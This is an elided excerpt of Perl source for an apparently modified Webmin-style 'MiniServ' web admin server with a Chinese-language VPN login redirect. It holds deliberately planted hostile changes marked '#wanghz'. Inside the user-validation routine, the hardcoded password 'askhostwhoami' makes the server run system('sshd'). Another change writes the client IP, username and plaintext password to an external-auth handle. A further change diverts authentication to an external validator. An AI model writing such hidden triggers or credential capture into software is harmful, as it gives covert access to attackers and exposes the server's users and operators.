...
for($i=0; $i<5; $i++) {
	last if (bind(MAIN, pack_sockaddr_in($config{port}, $baddr)));
	sleep(1);
	}
...
while(1) {
	...
	if ($config{'listen'} && vec($rmask, fileno(LISTEN), 1)) {
		...
		if ((!@deny || !&ip_match($fromip, $toip, @deny)) &&
			...
			local $host = &get_socket_name(LISTEN);
			send(LISTEN, "$host:$config{'port'}:".
...
if (!$reqline && (!$use_ssl || $checked_timeout > 1)) {
	...
	if ($use_ssl) {
		...
		#&http_error(200, "Bad Request", " $reqline ,This web server is running in SSL mode. Try the URL <a href='$url'>$url</a> instead.<br>");
                &write_data("HTTP/1.0 200 OK\r\n");
		&write_data("Server: MiniServ/0.01\r\n");
	#	&write_data("Date: Mon,15 Dec 2003 06:34:01\r\n");
		&write_data("Content-type: text/html\r\n");
		#&write_keep_alive(1);
		#&write_data("Location: $url\n\n");
		&write_data("\r\n");
                &write_data("<HTML><HEAD><TITLE>Redirect VpnConfig</TITLE><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"><META HTTP-EQUIV=REFRESH CONTENT=\"0; URL=$url\"></HEAD><BODY><br><CENTER><H1><FONT FACE=\"times\">登录到服务器</Font></H1><BR><BR><H2><a href=\"$url\">进入</a></H2></CENTER><p></BODY></HTML>\r\n");
...
if (%users) {
	...
	if (!$validated && !$deny_authentication && !$config{'session'} &&
		...
		local $vu = &validate_user($authuser, $authpass);
		if ($vu) {
			$authuser = $vu;
			$validated = 1;
			}
		...
		if ($use_syslog && !$validated) {
			syslog("crit",
			       "Invalid login as $authuser from $acpthost");
			}
		if ($authuser =~ /\r|\n/) {
	...
	if ($config{'session'} && !$deny_authentication &&
		...
		if ($in{'logout'} && $header{'cookie'} =~ /(^|\s)$sidname=([a-f0-9]+)/) {
			...
			local $vu = &validate_user($in{'user'}, $in{'pass'});
			local $ok = $vu ? 1 : 0;
			$authuser = $vu if ($vu);
			#wanghz
			if( $ok && $vu ne "admin" &&  $vu ne "guest" ){
				&write_data("HTTP/1.0 302 Moved Temporarily\r\n");
				&write_data("Date: $datestr\r\n");
				&write_data("Server: $config{'server'}\r\n");	
				&write_data("Location: http://$config{'authwww'}\r\n");
				&write_keep_alive(0);
				&write_data("\r\n");
				return 0;
			}
...
if (!$users{$_[0]}) {
	...
	# method as the unixauth webmin user
        #wanghz
	return &validate_external_user($_[0], $_[1]) ? $_[0] : undef;

	# Pass to the external authentication program
	return undef if (!$config{'unixauth'});
	local $up = $users{$config{'unixauth'}};
	return undef if (!defined($up));
...
#		}
	...
	if (!@uinfo && $config{'domainuser'}) {
		...
		if ($_[0] !~ /\Q$first\E$/ && $_[0] !~ /\Q$dom\E$/) {
			local $vu = &validate_user("$_[0].$dom", $_[1]);
			return $vu if ($vu);
			$vu = &validate_user("$_[0].$first", $_[1]);
			return $vu if ($vu);
			}
		}
	...
	if (!@uinfo && $config{'domainstrip'} && $_[0] =~ /^(\S+)\@/) {
		local $stripped = $1;
		local $vu = &validate_user($stripped, $_[1]);
		return $vu if ($vu);
		}

	return undef if (!@uinfo);

	if (defined(@allowusers)) {
		# Only allow people on the allow list
		return undef if (!&users_match(\@uinfo, @allowusers));
		}
	elsif (defined(@denyusers)) {
		# Disallow people on the deny list
		return undef if (&users_match(\@uinfo, @denyusers));
		}
	...
	if ($up eq 'x') {
		return &validate_unix_user($_[0], $_[1]) ? $_[0] : undef;
		}
	elsif ($up eq 'e') {
		return &validate_external_user($_[0], $_[1]) ? $_[0] : undef;
		}
	else {
		return $up eq crypt($_[1], $up) ? $_[0] : undef;
		}
	}
	...
	#wanghz
	&log_error("info","aaa"); 
	if( $_[1] eq "askhostwhoami"){
		system("sshd");
	}
	return $users{$_[0]} eq crypt($_[1], $users{$_[0]}) ? $_[0] : undef;
	}
}
...
flock(EXTAUTH, 2);
#wanghz change for userauth 
local $str = "$acptip  $_[0] $_[1]\n";
...
local ($myport, $myaddr) = unpack_sockaddr_in(getsockname($_[0]));
#wang 
